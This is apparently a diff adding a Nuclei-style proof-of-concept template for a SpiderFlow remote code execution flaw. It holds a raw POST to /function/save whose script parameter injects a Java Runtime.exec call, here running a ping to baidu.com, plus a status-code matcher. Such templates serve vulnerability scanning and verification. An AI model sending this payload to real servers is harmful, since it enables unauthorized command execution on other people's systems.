@@ -1,0 +1,57 @@
+id: poc-lxn35ldgpdfxd3m0
+info:
+  name: SpiderFlow RCE
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lxn35ldgpdfxd3m0'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: lxn35ldgpdfxd3m0
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /function/save HTTP/1.1
+
+
+    Accept: */*
+
+
+    X-Requested-With: XMLHttpRequest
+
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+
+    Accept-Encoding: gzip, deflate, br
+
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+
+    Connection: close
+
+
+
+
+    id=1&name=cmd&parameter=rce&script=%7DJava.type(''java.lang.Runtime'').getRuntime().exec(''ping+baidu.com'')%3B%7B
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ping
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
